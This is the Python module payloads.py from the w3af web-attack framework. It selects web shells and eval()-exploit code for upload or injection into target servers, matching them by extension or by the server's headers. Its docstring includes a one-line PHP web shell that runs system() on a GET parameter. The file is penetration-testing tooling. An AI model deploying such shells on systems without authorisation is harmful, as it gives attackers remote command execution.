'''
payloads.py

Copyright 2009 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

import core.data.kb.knowledgeBase as kb
from core.controllers.w3afException import w3afException

import os.path


SHELL_IDENTIFIER = '15825b40c6dace2a7cf5d4ab8ed434d5'
# 15825b40c6dace2a
# 7cf5d4ab8ed434d5


def get_webshells( extension, forceExtension=False ):
    '''
    This method returns a webshell content to be used in exploits, based on the extension, or based
    on the x-powered-by header.
    
    Plugins calling this function, should depend on "discovery.serverHeader" if they want to use 
    the complete power if this function.
    '''
    return _get_file_list( 'webshell', extension, forceExtension )

def get_shell_code( extension, forceExtension=False ):
    '''
    Like getShell, but instead of returning a list of the contents of a web shell,
    that you can upload to a server and execute, this method returns the CODE
    used to exploit an eval() vulnerability.
    
    Example:
        getShell() returns: 
            "<?  system( $_GET['cmd'] )    ?>"
        
        get_shell_code() returns:
            "system( $_GET['cmd'] )"

    @return: The CODE of the web shell, suitable to use in an eval() exploit.
    '''
    return _get_file_list( 'code', extension, forceExtension )
    
def _get_file_list( type_of_list, extension, forceExtension=False ):
    '''
    @parameter type_of_list: Indicates what type of list to return, options:
        - code
        - webshell
    
    @return: A list with tuples of filename and extension for the webshells available in the 
    webshells directory.
    '''
    known_framework = []
    uncertain_framework = []
    path = 'plugins' + os.path.sep + 'attack' + os.path.sep + 'payloads' + os.path.sep
    path += type_of_list + os.path.sep
    
    if forceExtension:
        filename =  path + type_of_list + '.' + extension
        real_extension = extension
        known_framework.append( (filename, real_extension) )
    else:
        poweredByHeaders = kb.kb.getData( 'serverHeader' , 'poweredByString' )
        filename = ''
        
        file_list = [ x for x in os.listdir( path ) if x.startswith(type_of_list) ]

        for shell_filename in file_list:
                
            filename = path + shell_filename
            real_extension = shell_filename.split('.')[1]
                
            # Using the powered By headers
            # More than one header can have been sent by the server
            for h in poweredByHeaders:
                if h.lower().count( real_extension ):
                    known_framework.append( (filename, real_extension) )
            
            # extension here is the parameter passed by the user, that can be '' , this happens in davShell
            uncertain_framework.append( (filename, real_extension) )
    
    # We keep the order, first the ones we think could work, then the ones that may
    # work but... are just a long shot.
    known_framework.extend( uncertain_framework ) 
    
    res = []
    for filename, real_extension in known_framework:
        try:
            cmd_file = open( filename )
        except:
            raise w3afException('Failed to open filename: ' + filename )
        else:
            file_content = cmd_file.read()
            cmd_file.close()
            res.append( (file_content, real_extension) )
            
    return res
